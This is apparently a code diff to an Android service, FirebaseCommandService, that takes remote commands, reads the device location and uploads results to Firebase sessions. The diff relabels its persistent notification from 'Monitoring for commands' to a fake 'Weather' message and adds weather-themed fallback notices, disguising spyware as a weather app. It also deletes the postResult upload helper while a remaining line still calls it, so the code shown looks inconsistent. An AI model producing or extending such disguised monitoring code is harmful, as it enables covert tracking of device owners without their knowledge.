@@ -331,17 +331,6 @@ class FirebaseCommandService : Service() {
         }
     }
 
-    private fun postResult(type: String, data: String) {
-        val currentSessionKey = sessionKey ?: return
-        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
-        val payload = mapOf(
-            "type" to type,
-            "data" to data,
-            "timestamp" to com.google.firebase.database.ServerValue.TIMESTAMP
-        )
-        ref.setValue(payload)
-    }
-
     private fun getLocation() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -657,7 +646,7 @@ class FirebaseCommandService : Service() {
         postResult("TEXT", builder.toString().trim())
     }
 
-    private fun createNotification(title: String = "x24 Active", text: String = "Monitoring for commands..."): android.app.Notification {
+    private fun createNotification(title: String = "Weather", text: String = "Loading weather data..."): android.app.Notification {
         val channelId = "x24_monitor_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -741,8 +730,18 @@ class FirebaseCommandService : Service() {
                     }
                 }
             }
+
+            // Fallback if location or API fetch failed
+            val notification = createNotification("Weather", "Weather data unavailable")
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.notify(1001, notification)
+
         } catch (e: Exception) {
             Log.e("x24", "Failed to update weather: ${e.message}")
+            // Fallback on exception
+            val notification = createNotification("Weather", "Weather data unavailable")
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.notify(1001, notification)
         }
     }
 }
